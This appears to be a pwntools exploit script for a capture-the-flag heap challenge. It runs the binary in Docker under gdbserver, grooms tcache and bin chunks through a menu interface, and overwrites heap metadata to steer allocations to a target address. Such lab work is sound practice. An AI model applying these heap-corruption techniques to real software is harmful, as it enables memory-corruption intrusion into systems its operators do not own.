from pwn import *
import subprocess, os, atexit, sys

BINARY = "./chall"
IMAGE_NAME = "chall-debug"
CONTAINER = "chall-debug-run"
HOST_PORT = 12345  # host port for GDB
CONTAINER_PORT = 9999  # gdbserver port inside container
DOCKERFILE = "Dockerfile.debug"

context.binary = ELF(BINARY, checksec=False)
context.terminal = ["gnome-terminal", "--"]

ret = subprocess.call(
    ["docker", "build", "-f", DOCKERFILE, "-t", IMAGE_NAME, "."],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)
p = process(
    [
        "docker",
        "run",
        "--rm",
        "-i",
        "--name",
        CONTAINER,
        "--cap-add=SYS_PTRACE",
        "--security-opt",
        "seccomp=unconfined",
        "-p",
        f"{HOST_PORT}:{CONTAINER_PORT}",
        IMAGE_NAME,
        "gdbserver",
        "--once",
        f"0.0.0.0:{CONTAINER_PORT}",
        "/home/user/chall",
    ],
    stderr=subprocess.DEVNULL,
)

log.success("Challenge is paused under gdbserver, waiting for GDB.")

gdb_script = "/tmp/.chall_gdb_init"

with open(gdb_script, "w") as f:
    f.write(f"file {BINARY}\n")
    f.write(f"target remote 127.0.0.1:{HOST_PORT}\n")

subprocess.Popen(context.terminal + ["gdb", "-x", gdb_script])


def malloc(index, size):
    p.sendlineafter(b"choice:", b"1")
    p.sendlineafter(b"index:", str(index))
    p.sendlineafter(b"size:", str(size))


def update(index, data):
    p.sendlineafter(b"choice:", b"2")
    p.sendlineafter(b"index:", str(index))
    p.sendlineafter(b"bytes:", data)


def delete(index):
    p.sendlineafter(b"choice:", b"3")
    p.sendlineafter(b"index:", str(index))


def copy(index1, index2):
    p.sendlineafter(b"choice:", b"4")
    p.sendlineafter(b"index:", str(index1))
    p.sendlineafter(b"index:", str(index2))


malloc(0x0, 0x428 - 0x10)
malloc(0x1, 0x18)
malloc(0x2, 0x418 - 0x10)
malloc(0x3, 0x18)


for i in range(0x6, 0x20):
    malloc(i, 0x90)


for i in [6, 8, 10, 12, 14, 16, 18]:
    delete(i)

for i in [7, 9, 11, 13, 15, 17, 19]:
    delete(i)
malloc(0x21, 0xA0)

delete(0x0)
malloc(0x4, 0x438)

delete(0x2)

payload = pack(0x0) * 0x2 + pack(0x0) + pack(0x1337000 - 0x20 + 0x8)
payload += b"A" * (0x420 - len(payload))

update(0x0, payload)
malloc(0x5, 0x438 - 0x10)

payload = pack(0x0) * 0x1 + pack(0x1337000 - 0x10) + b"A" * (0xA0 - 0x10 - 0x10)
update(17, payload)


for i in [6, 8, 10, 12, 14, 16, 18]:
    malloc(i, 0x90)

malloc(7, 0x90)
malloc(0x23, 0x90)
malloc(0x24, 0x90)

payload = pack(0xDEADBEEFDEADCAFE) + b"A" * (0x90 - 0x8)
update(0x24, payload)


p.interactive()
